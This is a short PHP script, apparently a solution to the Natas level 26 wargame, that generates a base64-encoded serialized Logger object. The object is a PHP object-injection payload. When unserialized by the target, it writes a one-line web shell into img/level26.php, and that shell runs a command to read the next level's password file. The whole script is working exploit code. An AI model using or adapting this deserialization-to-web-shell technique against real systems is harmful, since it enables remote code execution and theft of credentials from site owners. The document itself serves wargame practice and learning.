<?php
    class Logger{
            private $logFile;
            private $initMsg;
            private $exitMsg;
        
            function __construct(){
                $this->initMsg = "Readpass\n";
                $this->exitMsg = "<?php system('cat /etc/natas_webpass/natas27');?>";
                $this->logFile = "img/level26.php";
            }                       
                        
        }
    $logger = new Logger();
    echo base64_encode(serialize($logger));
?>